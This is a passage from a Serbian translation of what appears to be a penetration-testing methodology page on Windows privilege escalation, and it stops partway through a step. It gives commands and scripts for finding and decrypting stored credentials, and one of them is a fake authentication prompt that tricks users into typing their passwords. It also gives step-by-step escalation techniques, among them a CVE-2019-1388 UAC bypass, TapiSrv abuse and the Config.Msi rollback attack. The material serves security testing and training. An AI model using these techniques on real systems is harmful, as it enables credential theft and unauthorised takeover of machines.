      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM i SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive rezervne kopije Windows Imaging (`.wim`) datoteka mogu da sadrže i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima sa rezervnim kopijama ili slikama i pregledajte **nazive članova** slike pre izdvajanja bilo čega; samo `.wim` ime datoteke ne dokazuje da su hive-ovi izloženi, a uobičajene `install.wim`, `boot.wim` i recovery slike često su lažni tragovi. SMB share predstavlja zaseban put za pristup i treba ga proveravati samo ako je taj share u opsegu. Pogledajte Microsoft-ova uputstva za [Windows slike](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za registry hive datoteke](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud kredencijali

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala primenu prilagođenih lokalnih administratorskih naloga na grupi računara pomoću Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svim korisnicima domena. Drugo, lozinke u ovim GPP-ovima, šifrovane AES256 algoritmom pomoću javno dokumentovanog podrazumevanog ključa, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik, jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija za skeniranje lokalno keširanih GPP datoteka koje sadrže polje „cpassword“ koje nije prazno. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje cPassword-a:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Upotreba crackmapexec za pribavljanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config fajla sa podacima za autentifikaciju:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Arhive rezervnih kopija u IIS webroot-u

Stara ZIP rezervna kopija smeštena direktno u webroot-u koji se poslužuje može da otkrije prethodne konfiguracione fajlove i akreditive koji se mogu ponovo koristiti. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je jedan od kandidata. Brzi lokalni popis može da izlista nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da oporavljeni kredencijal omogućava viši nivo privilegija.

### OpenVPN kredencijali

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logovi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje** **akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže pristupne podatke**

Poznate datoteke koje su ranije sadržale **lozinke** u **otvorenom tekstu** ili Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku sa odgovarajućim nazivom tretirajte kao mogući šifrovani trezor; samo njeno postojanje ne znači da možete da je pročitate, otključate ili koristite bilo koje sačuvane akreditive. Kada proveravate gde se takve datoteke čuvaju, pregledajte dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiva KeePass `.kdbx` datoteka je takođe samo trag koji ukazuje na šifrovani trezor. Za otključavanje su potrebni stvarna glavna lozinka i sve konfigurisane datoteke ključeva ili faktori naloga. Ako ovlašćena provera pronađe LM:NT par heševa u unosu, proverite navedeni nalog i da li je NT heš aktuelan i prihvaćen na odredišnom NTLM servisu pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje administratorska niti SYSTEM prava; za pristup udaljenom servisu moraju postojati i odgovarajuća prava naloga i zaseban korak izvršavanja servisa. Inventar treba da navede putanju do trezora i da li je čitljiv, a ne da ispisuje bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Kredencijali u Kanti za otpatke

Proverite dostupne unose u Kanti za otpatke i potražite obrisane rezervne kopije i arhive konfiguracija, kao i datoteke čiji nazivi izričito pominju kredencijale. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara i nekoliko meseci, a imati sasvim običan naziv. Windows čuva originalnu putanju i vreme brisanja u `$I` zapisu, a obrisanu datoteku kao odgovarajući `$R` unos; pre otvaranja arhive pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji oporavljiva rezervna kopija. Naziv arhive tretirajte kao razlog za proveru, a ne kao dokaz da sadrži ispravnu tajnu.

Dostupna obrisana `.pfx` datoteka može biti i trag za **potpisivanje koda**. Ako sadrži dostupan privatni ključ, tim ključem se može potpisati izmenjena PowerShell skripta; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), and [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Za izvršavanje pod drugim nalogom, trenutni identitet mora moći da izmeni konkretnu skriptu, na snazi mora biti pravilo koje prihvata dobijeni potpis za tu skriptu i ciljni nalog, a zakazani zadatak ili drugi proces sa višim privilegijama mora zaista da je pokrene. Sam naziv `.pfx` datoteke, predmet sertifikata ili skripta sa dozvolom za upis ne dokazuju da je ovaj niz uslova ispunjen. Pregledajte metapodatke, ACL-ove, pravila i zakazanu komandu pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka.

Pregledajte i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za tragovima koji upućuju na kredencijale. Izvezena BitLocker recovery kopija može biti sačuvana kao HTML ili TXT, ponekad unutar arhive rezervne kopije sa nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka sa starijim rezervnim kopijama; pregledajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za offline oporavak domenskih kredencijala potrebna je i odgovarajuća `SYSTEM` hive, kao što je opisano u [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sam naziv datoteke i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra koji sadrže kredencijale**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje OpenSSH ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome, Edge ili Firefox**.\
Proverite i istoriju, obeleživače i omiljene stavke u pregledačima, jer se tamo možda čuvaju neke **lozinke**.

Za uobičajeni profil **Default** trenutnog korisnika u Edge-u, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da je promene. Samo postojanje datoteke ukazuje na moguću lokaciju sačuvanih akreditiva: proverite da li su datoteke čitljive, da li je dostupan DPAPI kontekst odgovarajućeg korisnika ili drugi odobreni ključni materijal i da li sačavljena prijava pripada nalogu sa višim privilegijama. Enumeracija samo putanja ne mora da otvara bazu podataka niti da ispisuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu uparene datoteke sa ključem i šifrovanim prijavama. Njihovo postojanje samo ukazuje na moguću lokaciju akreditiva: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li je ključ zaštićen Primary Password-om pre nego što zaključite da su akreditivi upotrebljivi. Ako oporavljeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za kontrolu grupe i [LAPS prava za čitanje ili dešifrovanje lozinke](../active-directory-methodology/laps.md) te grupe; artefakti pregledača sami po sebi ne dokazuju put do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Prepisivanje COM DLL-a**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se pomoću ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, koji se identifikuju pomoću ID-eva interfejsa (IID).

COM klase i interfejsi definisani su u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, redom. Ovaj registar se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podređeni ključ registra **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL**, kao i vrednost `ThreadingModel`, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - Prepisivanje COM DLL-a: Unutar CLSID-ova ovog registra možete pronaći podređeni ključ registra InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koji DLL** koji će biti pokrenut, mogli biste da **eskalirate privilegije** ako taj DLL pokreće drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Potražite datoteku sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar da biste pronašli nazive ključeva i lozinke**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski izvrši svaki Metasploit POST modul koji traži akreditive** na žrtvinom sistemu.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) pretražuje **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u običnom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali koji nasleđuje sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle do privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i **ovu drugu objavu za potpunije objašnjenje kako da testirate i zloupotrebite dodatne otvorene handle-ove procesa i niti nasleđene sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, koji se nazivaju **pipe-ovi**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows nudi funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da razmenjuju podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **client** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** tog **client-a**, pod uslovom da ima potrebna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira preko pipe-a koji možete da oponašate pruža priliku da **steknete veće privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje ovakvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Sledeći alat takođe omogućava **presretanje komunikacije named pipe-a pomoću alata poput Burp-a:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privescs-a** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani client može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobije administratorska prava za Telephony i učita proizvoljan DLL kao servis. Ceo postupak:

- Pozovite `ClientAttach` sa `pszDomainUser` podešenim na postojeću putanju u koju može da se upisuje → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za upis asinhronih događaja.
- Svaki događaj upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaje pomoću `GetAsyncEvents` (`Req_Func 0`), pa zatim poništite registraciju/isključite servis da biste ponavljali determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa putanjom do proizvoljnog DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvrše nešto u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderera

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da aktiviraju opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Praćenje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive kroz komandnu liniju**. Skripta u nastavku beleži komandne linije procesa svake dve sekunde i poredi trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ sa korisničkog naloga bez privilegija.

To omogućava istovremeno eskaliranje privilegija i zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nije potrebno ništa instalirati, a binarnu datoteku koja se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se iskoristila ova ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da biste **naučili o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload Directory Junctions into a Served Root

Aplikacija može da kreira predvidljiv poddirektorijum za otpremanje, upiše ime datoteke koje je dostavio pozivalac, a zatim obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni taj poddirektorijum i zameni ga NTFS junction-om pre upisa na strani servera, upis može da prati junction do direktorijuma koji opslužuje web server. Skripta smeštena tamo može da se izvrši pod identitetom web usluge ako server izvršava taj tip datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za otpremanje u koji može da se upisuje ili postojeći junction sami po sebi to ne dokazuju.

Proverite tačnu konstrukciju putanje i vremenski raspored u handler-u za otpremanje, efektivna prava korisnika za brisanje/kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li program za upis prati reparse points i da li web server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa programa za upis i web servera. Pasivna inventarizacija može da prikaže ACL-ove direktorijuma i reparse metapodatke, ali ne može da utvrdi ponašanje handler-a niti buduću zamenu junction-a. Ako se izvršavanje odvija pod servisnim nalogom, proverite **stvarni token procesa** pre nego što razmotrite zaseban put preko privilegija tokena.

## Od Arbitrary Folder Delete/Move/Rename do SYSTEM EoP

Tehnika opisana [**u ovom blog post-u**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe Windows Installer rollback funkcije kako bi se legitimne datoteke zamenile zlonamernim tokom procesa deinstalacije. Za to napadač mora da napravi **zlonamerni MSI installer** koji će se koristiti za preuzimanje kontrole nad fasciklom `C:\Config.Msi`, koju će Windows Installer kasnije koristiti za čuvanje rollback datoteka tokom deinstalacije drugih MSI paketa; te rollback datoteke biće izmenjene tako da sadrže zlonamerni payload.

Sažetak tehnike:

1. **Faza 1 – Priprema za preuzimanje kontrole (ostaviti `C:\Config.Msi` praznu)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u fasciklu u koju može da se upisuje (`TARGETDIR`).
    - Označite installer kao **„UAC Compliant“**, tako da može da ga pokrene **korisnik koji nije administrator**.
    - Ostavite **handle** otvoren ka datoteci nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i preimenuje ih u `.rbf` datoteke (rollback rezervne kopije).
    - **Anketirajte otvoreni handle datoteke** pomoću `GetFinalPathNameByHandle` da biste detektovali kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu uninstall akciju (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim pošaljite signal nazad kako bi se deinstalacija završila.
    - Windows Installer ne uspeva da obriše `.rbf`; pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi (napadač) ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazna** i spremna za preuzimanje kontrole.

> U ovom trenutku **pokrenite SYSTEM-level arbitrary folder delete ranjivost** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte fasciklu `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite handle otvoren** sa `WRITE_DAC`.

- Korak 7: Pokrenite drugu instalaciju
    - Ponovo instalirajte `.msi`, uz:
        - `TARGETDIR`: lokaciju u koju može da se upisuje.
        - `ERROROUT`: promenljivu koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs`
    - Koristite `ReadDirectoryChangesW` da biste pratili `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
    - Zabeležite njegovo ime datoteke.

- Korak 9: Sinhronizujte pre rollback-a
    - `.msi` sadrži **prilagođenu install akciju (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo pri otvaranju handle-a**, tako da i dalje možete da upisujete u fasciklu.

- Korak 11: Ubacite lažne `.rbs` i `.rbf` datoteke
    - Prepišite `.rbs` datoteku **lažnom rollback skriptom** koja nalaže Windows-u da:
